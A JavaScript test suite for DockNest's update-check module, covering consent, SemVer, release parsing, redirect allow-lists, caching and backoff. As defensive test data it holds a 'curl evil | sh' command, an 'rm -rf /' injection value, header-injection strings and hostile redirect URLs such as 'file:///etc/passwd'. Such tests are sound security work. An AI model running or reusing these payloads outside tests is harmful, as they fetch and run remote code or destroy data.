import test from 'node:test';
import assert from 'node:assert/strict';
import { mkdtemp, rm } from 'node:fs/promises';
import { DatabaseSync } from 'node:sqlite';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { migrate } from '../src/migrations.js';
import { RELEASES_URL, ASSET_HOSTS, limits, ensureCheckRow, compareSemver, summarizeReleases, assetRedirect, manifestFields, manifestUrl, fetchManifest, releaseName, releaseNotes, highlights, claimCheck, runCheck, checkNow, startCheck, tickUpdateCheck, pendingCheck, nextAfterSuccess, nextAfterFailure } from '../src/updates/check.js';

const HOUR = 3_600_000, DAY = 24 * HOUR, T0 = Date.parse('2026-10-22T08:00:00.000Z'), quiet = () => {};
const RELEASE = 'v2.2.0', MANIFEST = 'https://github.com/DahanItamar/DockNest/releases/download/v2.2.0/docknest-release.json';
const ASSET = 'https://release-assets.githubusercontent.com/github-production-release-asset/1/2?sp=r&sig=secret-signature-value&jwt=secret-token';
async function database(t) {
  const directory = await mkdtemp(join(tmpdir(), 'docknest-update-check-')), file = join(directory, 'state.sqlite'), db = new DatabaseSync(file);
  t.after(async () => { await pendingCheck(); db.close(); await rm(directory, { recursive: true, force: true }); });
  migrate(db, { file, log: quiet });
  db.prepare("INSERT INTO users(id,email,password_hash,totp_secret,recovery_codes,enrolled,created_at) VALUES('admin','admin@example.invalid','x','x','[]',1,?)").run(new Date(T0).toISOString());
  return db;
}
const decide = (db, yes) => db.prepare('INSERT INTO update_preferences(id,check_enabled,decided_by,decided_at) VALUES(1,?,?,?) ON CONFLICT(id) DO UPDATE SET check_enabled=excluded.check_enabled').run(yes ? 1 : 0, 'admin', new Date(T0).toISOString());
const row = db => ({ ...db.prepare('SELECT * FROM update_checks WHERE id=1').get() });
const due = (db, at = T0) => db.prepare('UPDATE update_checks SET next_check_at=?,checked_at=? WHERE id=1').run(at, new Date(at - DAY).toISOString());
const json = (value, { status = 200, headers = {} } = {}) => new Response(typeof value === 'string' ? value : JSON.stringify(value), { status, headers: { 'content-type': 'application/json; charset=utf-8', ...headers } });
const redirect = (location, status = 302) => new Response(null, { status, headers: location === undefined ? {} : { location } });
const release = (tag, extra = {}) => ({ tag_name: tag, draft: false, prerelease: false, published_at: '2026-10-22T08:00:00Z', name: `DockNest ${tag}`, body: `Notes for ${tag}`, html_url: 'https://evil.example/html', assets: [{ browser_download_url: 'https://evil.example/asset' }], ...extra });
const manifest = (extra = {}) => ({ version: '2.2.0', tag: RELEASE, schemaVersion: 6, minUpgradeFrom: '2.1.0', highlights: { security: true, features: 3, improvements: 2, fixes: 4 }, notes: 'docs/releases/2026-11-01-v2.2.md', image: { name: 'ghcr.io/dahanitamar/docknest', digest: null }, command: 'curl evil | sh', ...extra });
// A fetch double: answers in order, records every call, and fails the test on any call it was not given an answer for.
function network(...answers) {
  const calls = [];
  const fetch = async (url, init) => {
    calls.push({ url, init });
    const answer = answers.shift();
    if (!answer) throw new Error(`Unexpected outbound call to ${url}`);
    return typeof answer === 'function' ? answer(url, init) : answer;
  };
  return { fetch, calls };
}
const check = (db, fetch, extra = {}) => runCheck({ db, fetch, version: '2.1.0', now: () => T0, random: () => 0, timeoutMs: 200, ...extra });
async function consented(t) { const db = await database(t); decide(db, true); ensureCheckRow(db, T0); return db; }

test('no outbound call before consent, after "No" or once checks are turned off', async t => {
  const db = await database(t), { fetch, calls } = network(), logs = [];
  const everyPath = async () => {
    assert.equal(tickUpdateCheck({ db, fetch, now: () => T0 }, message => logs.push(message)), null);
    assert.equal(startCheck({ db, fetch, now: () => T0 }), null);
    assert.deepEqual(await checkNow({ db, fetch, now: () => T0 }), { claimed: false });
    assert.equal(claimCheck(db, { now: T0, manual: true }), false);
    assert.deepEqual(await check(db, fetch), { skipped: true });
  };
  await everyPath();
  assert.equal(db.prepare('SELECT count(*) AS n FROM update_checks').get().n, 0, 'no check row before consent');
  decide(db, false); await everyPath();
  assert.equal(db.prepare('SELECT count(*) AS n FROM update_checks').get().n, 0, 'no check row after "No"');
  decide(db, true); claimCheck(db, { now: T0 }); due(db); decide(db, false); await everyPath();
  assert.equal(row(db).last_success_at, null, 'nothing is written while checks are off');
  assert.equal(calls.length, 0); assert.deepEqual(logs, []);
});

test('SemVer precedence, including pre-releases and long numeric parts', () => {
  const ordered = ['1.0.0-alpha', '1.0.0-alpha.1', '1.0.0-alpha.beta', '1.0.0-beta', '1.0.0-beta.2', '1.0.0-beta.11', '1.0.0-rc.1', '1.0.0', '1.0.1', '1.9.0', '1.10.0', '2.0.0', 'v10.0.0', '99999999999999999999.0.0'];
  for (let i = 0; i < ordered.length; i++) for (let j = 0; j < ordered.length; j++) assert.equal(compareSemver(ordered[i], ordered[j]), Math.sign(i - j), `${ordered[i]} vs ${ordered[j]}`);
  assert.equal(compareSemver('2.2.0+build.1', 'v2.2.0'), 0, 'build metadata is ignored');
  assert.equal(compareSemver('99999999999999999999.0.1', '99999999999999999999.0.0'), 1);
  for (const bad of ['2.2', '02.1.0', 'v2.2.0-', '2.2.0-01', 'latest', '', null, 'v'.repeat(70)]) assert.throws(() => compareSemver(bad, '1.0.0'), TypeError);
});

test('the latest release is the highest final version computed locally; drafts, pre-releases and odd tags are ignored', () => {
  const list = [
    release('v2.9.0'), release('v2.10.0', { name: 'Older position, higher version' }), release('v3.0.0', { prerelease: true }), release('v4.0.0', { draft: true }),
    release('v3.1.0-rc.1'), release('v2.11.0-rc.1', { prerelease: true }), release('v9.0.0', { draft: undefined }), release('v9.1.0', { prerelease: 'false' }),
    release('v2.3'), release('2.4.0'), release('v02.5.0'), release('v2.6.0 '), release(' v2.7.0'), release('v2.10.0', { name: 'duplicate' }), null, 'v8.0.0', [release('v7.0.0')],
    release(`v1.0.${'9'.repeat(40)}`), release('v1.0.0'), release('v2.1.0', { published_at: 'yesterday' }),
  ];
  const { latest, releases } = summarizeReleases(list);
  assert.deepEqual(latest, { tag: 'v2.10.0', publishedAt: '2026-10-22T08:00:00.000Z', notes: 'Notes for v2.10.0' });
  assert.deepEqual(releases.map(entry => entry.tag), ['v2.10.0', 'v2.9.0', 'v2.1.0', 'v1.0.0']);
  assert.deepEqual(releases[0], { tag: 'v2.10.0', name: 'Older position, higher version', publishedAt: '2026-10-22T08:00:00.000Z' });
  assert.equal(releases[2].publishedAt, null, 'an unparsable date is dropped');
  assert.deepEqual(summarizeReleases([release('v3.0.0', { prerelease: true }), release('v2.0.0', { draft: true })]), { latest: null, releases: [] });
});

test('a check reads only the allowed fields, follows one manifest redirect to an asset host, and never stores the redirect URL', async t => {
  const db = await consented(t), logs = [];
  const list = [release('v2.1.0', { body: 'older body' }), release(RELEASE, { body: 'Line one\r\nLine\u0000 two‮' }), release('v2.3.0-rc.1', { prerelease: true })];
  const { fetch, calls } = network(json(list, { headers: { etag: 'W/"abc123"' } }), redirect(ASSET), json(manifest()));
  const result = await tickUpdateCheck({ db, fetch, version: '2.1.0', now: () => T0, random: () => 0.5, timeoutMs: 200 }, message => logs.push(message));
  assert.equal(result.ok, true);
  assert.deepEqual(calls.map(call => call.url), [RELEASES_URL, MANIFEST, ASSET]);
  for (const { init } of calls) {
    assert.equal(init.redirect, 'manual'); assert.equal(init.method, 'GET');
    assert.deepEqual(Object.keys(init.headers).filter(name => !['Accept', 'User-Agent'].includes(name)), [], 'no cookie, token or install id');
    assert.equal(init.headers['User-Agent'], 'DockNest/2.1.0');
  }
  assert.equal(calls[0].init.headers.Accept, 'application/vnd.github+json');
  const cached = row(db);
  assert.equal(cached.status, 'ok'); assert.equal(cached.latest_version, RELEASE); assert.equal(cached.etag, 'W/"abc123"'); assert.equal(cached.failures, 0);
  assert.equal(cached.published_at, '2026-10-22T08:00:00.000Z');
  assert.equal(cached.release_notes, 'Line one\nLine two', 'only the latest body, with control characters removed');
  assert.deepEqual(JSON.parse(cached.manifest), { version: '2.2.0', tag: RELEASE, minUpgradeFrom: '2.1.0', schemaVersion: 6, highlights: { security: true, features: 3, improvements: 2, fixes: 4 } });
  assert.deepEqual(JSON.parse(cached.releases), [{ tag: RELEASE, name: 'DockNest v2.2.0', publishedAt: '2026-10-22T08:00:00.000Z' }, { tag: 'v2.1.0', name: 'DockNest v2.1.0', publishedAt: '2026-10-22T08:00:00.000Z' }]);
  const stored = JSON.stringify(cached) + logs.join('\n');
  for (const secret of ['secret-signature-value', 'secret-token', 'release-assets', 'evil.example', 'older body', 'curl evil', 'docs/releases']) assert.ok(!stored.includes(secret), `${secret} is not stored or logged`);
  assert.ok(cached.next_check_at >= T0 + DAY && cached.next_check_at <= T0 + DAY + 120 * 60_000);
  assert.deepEqual(logs, []);
});

test('ETag: a 304 keeps the cache, sends If-None-Match, does not fetch the manifest again and resets failures', async t => {
  const db = await consented(t);
  await check(db, network(json([release(RELEASE)], { headers: { etag: '"v1"' } }), json(manifest())).fetch);
  const before = row(db);
  due(db); await check(db, network(new Response('down', { status: 503 })).fetch);
  assert.equal(row(db).failures, 1);
  due(db); const { fetch, calls } = network(new Response(null, { status: 304 }));
  assert.equal((await check(db, fetch)).notModified, true);
  assert.equal(calls.length, 1, 'the cached manifest for the same tag is reused');
  assert.equal(calls[0].init.headers['If-None-Match'], '"v1"');
  const after = row(db);
  for (const field of ['latest_version', 'published_at', 'manifest', 'release_notes', 'releases', 'etag']) assert.equal(after[field], before[field], field);
  assert.equal(after.status, 'ok'); assert.equal(after.failures, 0); assert.equal(after.error, null);
  // A 304 after the manifest could not be fetched tries the manifest once more.
  db.prepare('UPDATE update_checks SET manifest=NULL WHERE id=1').run(); due(db);
  const again = network(new Response(null, { status: 304 }), json(manifest()));
  await check(db, again.fetch);
  assert.equal(again.calls.length, 2); assert.equal(JSON.parse(row(db).manifest).tag, RELEASE);
  // A malformed stored ETag is never sent.
  db.prepare("UPDATE update_checks SET etag=? WHERE id=1").run('"x"\r\nCookie: a'); due(db);
  const plain = network(json([release(RELEASE)]), json(manifest()));
  await check(db, plain.fetch);
  assert.equal(plain.calls[0].init.headers['If-None-Match'], undefined);
});

test('the release call refuses redirects, wrong types, malformed JSON, oversized and non-UTF-8 answers', async t => {
  const db = await consented(t);
  const endless = () => new Response(new ReadableStream({ pull(controller) { controller.enqueue(new TextEncoder().encode('[' + ' '.repeat(65536))); } }), { headers: { 'content-type': 'application/json' } });
  const cases = [
    [redirect('https://api.github.com/repositories/1/releases', 301), /redirect/], [redirect('https://evil.example/', 302), /redirect/], [redirect('/x', 307), /redirect/],
    [new Response('[]', { status: 500 }), /HTTP 500/], [new Response('<html>', { headers: { 'content-type': 'text/html' } }), /could not read/],
    [json({ message: 'not a list' }), /could not read/], [json('[{"tag_name":'), /could not read/],
    [json('[]', { headers: { 'content-length': String(limits.releasesBytes + 1) } }), /larger/], [endless(), /larger/],
    [new Response(new Uint8Array([0x5b, 0xff, 0x5d]), { headers: { 'content-type': 'application/json' } }), /could not read/],
  ];
  for (const [answer, message] of cases) {
    due(db); const { fetch, calls } = network(answer);
    const result = await check(db, fetch);
    assert.equal(result.ok, false); assert.match(result.error, message); assert.equal(calls.length, 1, 'never followed');
    assert.equal(row(db).status, 'failed'); assert.match(row(db).error, message);
  }
  // Exactly at the cap is still read.
  due(db); const padded = JSON.stringify([release('v2.0.0')]); const atCap = padded + ' '.repeat(limits.releasesBytes - Buffer.byteLength(padded));
  assert.equal((await check(db, network(json(atCap)).fetch)).ok, true);
});

test('timeouts and network errors fail the check with a fixed message', async t => {
  const db = await consented(t);
  const hang = (_url, init) => new Promise((_resolve, reject) => init.signal.addEventListener('abort', () => reject(init.signal.reason)));
  const stall = () => new Response(new ReadableStream({ start(controller) { controller.enqueue(new TextEncoder().encode('[')); } }), { headers: { 'content-type': 'application/json' } });
  for (const [answer, message] of [[hang, /within 10 seconds/], [stall, /within 10 seconds/], [() => { throw new TypeError('getaddrinfo ENOTFOUND api.github.com secret'); }, /^Could not reach GitHub\.$/]]) {
    due(db); const started = Date.now(), result = await check(db, network(answer).fetch, { timeoutMs: 50 });
    assert.equal(result.ok, false); assert.match(result.error, message); assert.ok(Date.now() - started < 2000);
  }
  // A caller's overall budget (Check now) also stops the call.
  due(db); const result = await check(db, network(hang).fetch, { timeoutMs: 10_000, signal: AbortSignal.timeout(50) });
  assert.match(result.error, /within 10 seconds/);
  assert.ok(!row(db).error.includes('secret'));
});

test('failures back off 1, 2, 4, 8, then 24 hours; rate limits schedule the retry time GitHub gives', async t => {
  const db = await consented(t), offsets = [];
  for (let i = 0; i < 6; i++) { due(db); await check(db, network(new Response('secret body text', { status: 502 })).fetch); offsets.push((row(db).next_check_at - T0) / HOUR); }
  assert.deepEqual(offsets, [1, 2, 4, 8, 24, 24]);
  assert.equal(row(db).failures, 6); assert.equal(row(db).error, 'GitHub answered with HTTP 502.');
  const cases = [
    [{ status: 403, headers: { 'x-ratelimit-remaining': '0', 'x-ratelimit-reset': String((T0 + 30 * 60_000) / 1000) } }, T0 + 30 * 60_000],
    [{ status: 429, headers: { 'retry-after': '120' } }, T0 + 120_000],
    [{ status: 429, headers: { 'retry-after': '0' } }, T0 + 60_000],
    [{ status: 403, headers: { 'x-ratelimit-reset': String((T0 + 7 * DAY) / 1000) } }, T0 + DAY],
    [{ status: 429, headers: { 'retry-after': new Date(T0 + 5 * 60_000).toUTCString() } }, T0 + 5 * 60_000],
  ];
  for (const [init, expected] of cases) {
    due(db); const result = await check(db, network(new Response('secret', init)).fetch);
    assert.equal(result.code, 'rate-limited'); assert.equal(row(db).next_check_at, expected);
    assert.equal(row(db).error, `GitHub rate limit reached. DockNest tries again at ${new Date(expected).toISOString()}.`);
  }
  due(db); db.prepare('UPDATE update_checks SET failures=0 WHERE id=1').run();
  assert.equal((await check(db, network(new Response('', { status: 403 })).fetch)).code, 'http');
  assert.equal(row(db).next_check_at, T0 + HOUR, 'a 403 without rate-limit headers uses the normal back-off');
  assert.equal(nextAfterFailure(T0, 99), T0 + DAY);
  assert.equal(nextAfterSuccess(T0, () => 0), T0 + DAY); assert.equal(nextAfterSuccess(T0, () => 0.9999999), T0 + DAY + 120 * 60_000);
});

test('manifest redirects go to exactly one of the two asset hosts, over https on 443, without login details, once', async t => {
  const db = await consented(t), list = () => json([release(RELEASE)]);
  const hostile = [
    'https://evil.example/docknest-release.json', 'https://release-assets.githubusercontent.com.evil.example/x', 'https://evilrelease-assets.githubusercontent.com/x',
    'https://sub.release-assets.githubusercontent.com/x', 'https://release-assets.githubusercontent.com./x', 'https://evil.example/release-assets.githubusercontent.com/x',
    'https://evil.example/?u=https://objects.githubusercontent.com/', 'http://release-assets.githubusercontent.com/x', 'https://release-assets.githubusercontent.com:8443/x',
    'https://user:pass@release-assets.githubusercontent.com/x', 'https://user@objects.githubusercontent.com/x', 'https://:pass@objects.githubusercontent.com/x',
    '/DahanItamar/DockNest/x', '//evil.example/x', 'javascript:alert(1)', 'file:///etc/passwd', 'https://140.82.112.3/x', 'https://[::1]/x',
    ' https://evil.example/', 'https://xn--release-assets-githubusercontent-com.example/x', '', undefined,
  ];
  for (const location of hostile) {
    assert.equal(assetRedirect(location), null, String(location));
    due(db); const { fetch, calls } = network(list(), redirect(location));
    const result = await check(db, fetch);
    assert.equal(result.ok, true, 'the offer still appears without a manifest'); assert.equal(result.manifest, null, String(location));
    assert.equal(calls.length, 2, `not followed: ${location}`); assert.equal(row(db).manifest, null);
  }
  for (const location of ['https://release-assets.githubusercontent.com:443/a?sig=s', 'https://objects.githubusercontent.com/b', 'https://RELEASE-ASSETS.GITHUBUSERCONTENT.COM/c']) {
    assert.ok(ASSET_HOSTS.includes(assetRedirect(location).hostname));
    due(db); const { fetch, calls } = network(list(), redirect(location, 307), json(manifest()));
    assert.equal((await check(db, fetch)).manifest.tag, RELEASE); assert.equal(calls.length, 3);
  }
  // A second redirect, even to an allowed host, and a non-200 answer are refused.
  for (const second of [redirect('https://objects.githubusercontent.com/again'), new Response('', { status: 404 }), new Response(null, { status: 304 })]) {
    due(db); const { fetch, calls } = network(list(), redirect(ASSET), second);
    assert.equal((await check(db, fetch)).manifest, null); assert.equal(calls.length, 3);
  }
  due(db); const direct = network(list(), new Response('', { status: 300, headers: { location: ASSET } }));
  assert.equal((await check(db, direct.fetch)).manifest, null); assert.equal(direct.calls.length, 2);
  assert.throws(() => manifestUrl('v2.2.0/../../x'), TypeError); assert.throws(() => manifestUrl('latest'), TypeError);
});

test('manifest content: version and tag must match, 64 KiB cap, only the typed fields are kept', async t => {
  const db = await consented(t);
  for (const bad of [manifest({ version: '2.2.1' }), manifest({ tag: 'v2.2.1' }), manifest({ tag: undefined }), [manifest()], 'manifest', null])
    assert.throws(() => manifestFields(bad, RELEASE), /does not match/);
  assert.deepEqual(manifestFields(manifest({ minUpgradeFrom: '2.1', schemaVersion: -1, highlights: ['security'] }), RELEASE), { version: '2.2.0', tag: RELEASE, minUpgradeFrom: null, schemaVersion: null, highlights: null });
  assert.deepEqual(manifestFields(manifest({ minUpgradeFrom: 'v2.1.0; rm -rf /', schemaVersion: '6', highlights: undefined }), RELEASE), { version: '2.2.0', tag: RELEASE, minUpgradeFrom: null, schemaVersion: null, highlights: null });
  assert.equal(manifestFields(manifest({ minUpgradeFrom: null }), RELEASE).minUpgradeFrom, null);
  assert.deepEqual(highlights({ security: 'true', features: 100, improvements: -1, fixes: 1.5, extra: 3 }), null);
  assert.deepEqual(highlights({ security: false, features: 0, improvements: 99, fixes: '3' }), { security: false, features: 0, improvements: 99 });
  assert.deepEqual(highlights(JSON.parse('{"__proto__":{"security":true},"fixes":2}')), { fixes: 2 });
  for (const answer of [json(manifest(), { headers: { 'content-length': String(limits.manifestBytes + 1) } }), json(JSON.stringify(manifest()) + ' '.repeat(limits.manifestBytes)), json(manifest({ version: '9.9.9' })), json('{not json')]) {
    due(db); const result = await check(db, network(json([release(RELEASE)]), answer).fetch);
    assert.equal(result.ok, true); assert.equal(result.manifest, null);
  }
});

test('the manifest is fetched only for a newer release and only while consent is still yes', async t => {
  const db = await consented(t);
  const same = network(json([release(RELEASE)]));
  assert.equal((await check(db, same.fetch, { version: '2.2.0' })).manifest, null); assert.equal(same.calls.length, 1);
  due(db); const older = network(json([release(RELEASE)]));
  await check(db, older.fetch, { version: '2.3.0' }); assert.equal(older.calls.length, 1);
  due(db); const prerelease = network(json([release(RELEASE)]), json(manifest()));
  assert.equal((await check(db, prerelease.fetch, { version: '2.2.0-rc.1' })).manifest.tag, RELEASE, 'a final release is newer than its own pre-release');
  due(db); const before = row(db);
  const revoked = network(() => { decide(db, false); return json([release(RELEASE)]); });
  assert.deepEqual(await check(db, revoked.fetch), { skipped: true });
  assert.equal(revoked.calls.length, 1, 'turning checks off stops the check before the manifest'); assert.deepEqual(row(db), before, 'and nothing is written');
});

test('release names, notes and the changelog cache stay within their caps', async t => {
  const db = await consented(t);
  assert.equal(releaseName('  Fix\u0000 \u001b[31mred\u001b[0m ‮evil​⁦ name\u0085\n '), 'Fix [31mred[0m evil name');
  assert.equal(releaseName('x'.repeat(500)).length, limits.nameChars);
  assert.equal(releaseName('a'.repeat(119) + '\u{1F600}'), 'a'.repeat(119), 'a surrogate pair is never cut in half');
  assert.equal(releaseName(42), ''); assert.equal(releaseNotes({}), null);
  const notes = releaseNotes('é'.repeat(40000));
  assert.ok(Buffer.byteLength(notes) <= limits.notesBytes); assert.equal(notes, 'é'.repeat(limits.notesBytes / 2));
  assert.equal(releaseNotes('a\r\nb\rc\td\u0007'), 'a\nb\nc\td');
  const list = Array.from({ length: 45 }, (_, index) => release(`v1.${index}.0`, { name: '"\\'.repeat(200), body: (index === 44 ? 'b' : 'o').repeat(70000 / (index === 44 ? 1 : 10)) }));
  await check(db, network(json(list)).fetch);
  const cached = row(db), releases = JSON.parse(cached.releases);
  assert.equal(releases.length, limits.releases); assert.equal(releases[0].tag, 'v1.44.0'); assert.equal(releases.at(-1).tag, 'v1.15.0');
  assert.ok(cached.releases.length <= limits.releasesJson); assert.ok(releases.every(entry => entry.name.length <= limits.nameChars && Object.keys(entry).join() === 'tag,name,publishedAt'));
  assert.equal(cached.release_notes.length, limits.notesBytes);
});

test('claims are atomic: one check at a time, Check now at most once a minute, a dead check is retried after its lease', async t => {
  const db = await consented(t);
  let release1;
  const { fetch, calls } = network(() => new Promise(resolve => { release1 = () => resolve(json([release('v2.0.0')])); }));
  const first = tickUpdateCheck({ db, fetch, version: '2.1.0', now: () => T0 }, quiet);
  assert.ok(first);
  assert.equal(tickUpdateCheck({ db, fetch, version: '2.1.0', now: () => T0 }, quiet), null);
  assert.equal(startCheck({ db, fetch, version: '2.1.0', now: () => T0 }), null);
  const waiting = checkNow({ db, fetch, version: '2.1.0', now: () => T0 });
  await new Promise(resolve => setImmediate(resolve)); release1();
  await first; assert.deepEqual(await waiting, { claimed: false }, 'Check now waits for the running check');
  assert.equal(calls.length, 1);
  // Another process: claims are checked in the database.
  assert.equal(claimCheck(db, { manual: true, now: T0 + 30_000 }), false, 'within a minute the cached result stays');
  assert.equal(claimCheck(db, { now: T0 + 30_000 }), false, 'the scheduled check is a day away');
  assert.equal(claimCheck(db, { manual: true, now: T0 + 61_000 }), true);
  assert.equal(claimCheck(db, { now: T0 + 61_000 + limits.claimMs - 1 }), false, 'a claimed check holds its lease');
  assert.equal(claimCheck(db, { now: T0 + 61_000 + limits.claimMs }), true, 'a check that died is retried after the lease');
});

test('the User-Agent carries only a valid DockNest version', async t => {
  const db = await consented(t), { fetch, calls } = network(json([]));
  await check(db, fetch, { version: '2.1.0\r\nX-Install-Id: 1' });
  assert.equal(calls[0].init.headers['User-Agent'], 'DockNest/unknown');
});

test('line and paragraph separators, Arabic letter mark, soft hyphen and Mongolian vowel separator are stripped from names and notes', () => {
  const noise = 'a\u2028b\u2029c\u061cd\u00ade\u180ef';
  assert.equal(releaseName(noise), 'abcdef'); assert.equal(releaseNotes(noise), 'abcdef');
});

test('Check now and the check after turn-on do not bypass a stored rate-limit retry time', async t => {
  const db = await consented(t), retry = T0 + 10 * 60_000;
  due(db); await check(db, network(new Response('', { status: 429, headers: { 'retry-after': '600' } })).fetch);
  assert.equal(row(db).status, 'failed'); assert.equal(row(db).next_check_at, retry);
  const { fetch, calls } = network();
  assert.deepEqual(await checkNow({ db, fetch, version: '2.1.0', now: () => T0 + 5 * 60_000 }), { claimed: false });
  assert.equal(startCheck({ db, fetch, version: '2.1.0', now: () => T0 + 5 * 60_000 }), null);
  assert.equal(calls.length, 0); assert.equal(row(db).next_check_at, retry);
  assert.equal(claimCheck(db, { manual: true, now: retry }), true, 'once the retry time has passed the check may run');
});

test('the manifest must be served as JSON or as a GitHub release asset', async t => {
  const db = await consented(t), body = JSON.stringify(manifest());
  for (const type of ['application/octet-stream', 'application/octet-stream; charset=binary']) assert.equal((await fetchManifest({ fetch: network(new Response(body, { headers: { 'content-type': type } })).fetch, tag: RELEASE, signal: AbortSignal.timeout(200) })).tag, RELEASE);
  for (const type of ['text/plain', 'text/html', '']) {
    const response = new Response(body, { headers: type ? { 'content-type': type } : {} });
    await assert.rejects(fetchManifest({ fetch: network(response).fetch, tag: RELEASE, signal: AbortSignal.timeout(200) }), { code: 'invalid' });
  }
  assert.equal((await fetchManifest({ fetch: network(json(manifest())).fetch, tag: RELEASE, signal: AbortSignal.timeout(200) })).tag, RELEASE);
  due(db); assert.equal((await check(db, network(json([release(RELEASE)]), new Response(body, { headers: { 'content-type': 'text/plain' } })).fetch)).manifest, null);
});

test('Check now waits for a running check no longer than its own budget', async t => {
  const db = await consented(t);
  const hang = (_url, init) => new Promise((_resolve, reject) => init.signal.addEventListener('abort', () => reject(new Error('aborted'))));
  const first = tickUpdateCheck({ db, fetch: hang, version: '2.1.0', now: () => T0, timeoutMs: 400 }, quiet);
  assert.ok(first);
  const started = Date.now();
  assert.deepEqual(await checkNow({ db, fetch: hang, version: '2.1.0', now: () => T0, timeoutMs: 30 }), { claimed: false });
  assert.ok(Date.now() - started < 300, 'returned at the caller budget, not when the running check ended');
  await first;
});
